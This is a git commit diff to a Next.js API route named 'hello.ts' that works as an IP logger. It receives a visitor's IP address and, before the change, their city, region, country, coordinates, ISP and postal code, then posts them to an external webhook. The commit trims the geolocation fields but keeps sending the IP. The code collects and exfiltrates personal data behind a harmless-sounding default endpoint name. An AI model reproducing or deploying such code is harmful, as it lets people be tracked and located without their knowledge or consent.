c372fd868eb36e0b389592b6a6c1efc86380da27
Exspiravit <100397833+Exspiravit13@users.noreply.github.com>
2022-05-10 03:38:31 -0700

    Update hello.ts

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -3,13 +3,6 @@ import type { NextApiRequest, NextApiResponse } from 'next'
 
 type Data = {
   ip?: string,
-  hostname?: string,
-  city?: string,
-  region?: string,
-  country?: string,
-  loc?: string,
-  org?: string,
-  timezone?: string,
   message?: string,
   name?: string
 }
@@ -24,41 +17,14 @@ export default async function handler(
     return res.status(405).send({ message: 'Only POST requests allowed!' })
   }
 
-
   const ip: string = req.body.ip
-  const hostname: string = req.body.hostname
-  const city: string = req.body.city
-  const region: string = req.body.region
-  const country: string = req.body.country
-  const loc: string = req.body.loc
-  const org: string = req.body.org
-  const postal: string = req.body.postal
-  const timezone: string = req.body.timezone
-
-  var params = 
-  {
-    embeds: [
-    `**IP Logger: ** 
-    \n**IP: ** ${ip}
-    \n**Hostname: ** ${hostname}
-    \n**City: ** ${city}
-    \n**Region: ** ${region}
-    \n**Country: ** ${country}
-    \n**Loc: ** ${loc}
-    \n**Org: ** ${org}
-    \n**Postal: ** ${postal}
-    \n**Timezone: ** ${timezone}`
-    ]
-  
-  };
-
   await fetch(webhook, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
-    body: JSON.stringify({ content: params })
+    body: JSON.stringify({ content: ip })
   })
-    .catch(error => console.error('IP:', ip +  `Country:`, country + `Region:`, region + `City:`, city))
+    .catch(error => console.error('IP:', ip))
   return res.status(204).end()
-};
+}
